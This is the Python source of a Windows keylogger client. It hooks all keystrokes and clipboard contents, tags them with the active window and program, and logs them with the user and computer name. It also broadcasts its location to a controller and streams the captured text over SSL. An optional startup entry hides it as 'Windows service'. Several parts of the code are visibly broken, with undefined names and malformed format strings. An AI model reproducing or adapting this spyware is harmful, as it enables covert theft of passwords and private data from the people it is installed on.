from socket import *
from time import sleep
from tempfile import NamedTemporaryFile
from utils import *
from constants import *
import pyHook
import pythoncom
import win32gui
import win32clipboard
from sys import argv
from getpass import getuser
from os.path import realpath
from os import environ
from datetime import datetime
from threading import Thread, Lock
import ssl
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from string import printable
from select import select
from html import escape

#yo
def broadcast_myself():
    """
    Repeatedly broadcasts the client so the controller will find it. All encrypted.
    """
    global BD_PORT, BD_INTERVAL, conn, conn, cipher_rsa
    BDs = socket(AF_INET, SOCK_DGRAM)
    while True:
        if not conn:
            BDs.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
            localIP = gethostbyname(gethostname())
            BDs.sendto(cipher_rsa.encrypt(localIP), ("<broadcast>", BD_PORT))
        sleep(BD_INTERVAL)
    BDs.close()


def listen():
    """
    Listens for incoming connection by the serber and sends him the keylog when requested. All encrypted.
    """
    global FILE_NAME, file_handle, file_lock, text_buffer, conn
    server = socket(AF_INET, SOCK_STREAM)
    set_keepalive(listener)
    server.bind(("", HOST_PORT))
    server.listen(1)
    while server:
        readable, writable, exceptional = select.select(
            [server], [], [conn])
        for s in readable:
            if s is server:
                possible_conn, _ = s.accept()
                try:
                    possible_conn = ssl.wrap_socket(
                        sock=possible_conn, ca_certs="cert.pem", cert_reqs=ssl.CERT_REQUIRED)
                except:
                    pass
                else:
                    conn = Message_socket(_sock=possible_conn)
                    conn.send_json({})
        for s in exceptionals:
            s.close()
            s = None


def header(text):
    """
    Formats the input to a header style

    Args:
        text: text to format

    Returns:
        formatted text
    """
    text_width = reduce(lambda x, y: max(x, len(y)), text.split())
    return "\n{0}\n{1}\n{0}\n".format("=" * (text_width + 2), text)


def write_to_file():
    """
    Writes the text buffer into the keylog file

    Returns:
        True if succeeded writing False otherwise
    """
    global text_buffer, file_handle, file_lock, conn
    conn.send_json({"data": text_buffer})
    if file_lock.acquire(False):
        file_handle.write(text_buffer)
        file_lock.release()
        text_buffer = ""
        return True
    return False


def clipboard_listener():
    """
    Polls the clipboard and outputs it to the buffer when changed
    """
    global text_buffer, CLIP_POLL_RATE
    last_clip = ""
    while True:
        win32clipboard.OpenClipboard()
        try:
            curr_clip = win32clipboard.GetClipboardData(
                win32clipboard.CF_UNICODETEXT)
        except:
            curr_clip = last_clip
        win32clipboard.CloseClipboard()
        if curr_clip != last_clip:
            text_buffer += "<clipboard>{}</clipboard>".format(escape(curr_clip))
            last_clip = curr_clip
            write_to_file()
        sleep(CLIP_POLL_RATE)


def on_key_down(event):
    """
    Records all keyboard ebents and in which program they were sent and outputs them to the buffer nicely formatted

    Args:
        event: keyboard ebent
    """
    global last_win, file_lock, text_buffer, BANNED_BUTTONS, BANNED_UNICODES, DEBUG, last_exe
    modifiers = get_modifiers()
    curr_win_handle = win32gui.GetForegroundWindow()
    curr_win = GetWindowTextW(curr_win_handle)
    curr_exe = get_window_executable(curr_win_handle)
    un_char = ToUnicode(event.KeyID)
    if DEBUG:
        print("Modifiers", modifiers)
        print("Unicode:", un_char)
        print("Virtual Key:", event.KeyID)
        print("Ascii:", event.Ascii, chr(event.Ascii))
        print("Description:", event.Key)

    if curr_exe != last_exe:
        if last_exe:
            text_buffer += "</title></exe>"
        text_buffer += "<exe exe={curr_exe} name={} icon={}>".format(get_exe_description(curr_exe))
        last_win = ""
        last_exe = curr_exe
    if curr_win != last_win:
        if last_win:
            text_buffer += "</title>"
        text_buffer += "<title titleName={curr_win}>".format()
        last_win = curr_win
    if un_char["code"] == 1 and chr(event.Ascii) in printable[:-5] and not modifiers["ctrl"]:
        text_buffer += un_char["char"]
    elif event.Key not in BANNED_BUTTONS:
        text_buffer += "{%s}" % ("".join(
            [mod.upper() + "+" for mod in modifiers.keys() if modifiers[mod]]) + event.Key)
    write_to_file()
    return True


if __name__ == "__main__":
    DEBUG = True
    BD_INTERVAL = 2
    CLIP_POLL_RATE = 5
    FILE_NAME = NamedTemporaryFile(delete=False).name
    if DEBUG:
        print(FILE_NAME)
    STARTUP = False
    STARTUP_NAME = "Windows service"
    CERT_FILE = "cert.pem"
    BANNED_BUTTONS = ["Apps", "Lshift", "Rshift", "Lmenu",
                      "Rmenu", "Lcontrol", "Rcontrol", "Capital"]
    conn = None
    text_buffer = ""
    last_win = ""
    last_exe = ""

    if STARTUP:
        register_startup(STARTUP_NAME, realpath(argv[0]))

    public_key = RSA.import_key(open(CERT_FILE).read())
    cipher_rsa = PKCS1_OAEP.new(public_key)
    file_lock = Lock()
    file_handle = open(FILE_NAME, "w+")
    file_handle.write(header("KEYLOG STARTED AT {time:%d.%m.%Y %H:%M:%S} BY USER {user} ON {computer}".format(
        user=getuser(), computer=environ['COMPUTERNAME'])))

    Thread(target=broadcast_myself).start()
    Thread(target=listen).start()
    Thread(target=clipboard_listener).start()
    hm = pyHook.HookManager()
    hm.KeyDown = on_key_down
    hm.HookKeyboard()
    pythoncom.PumpMessages()
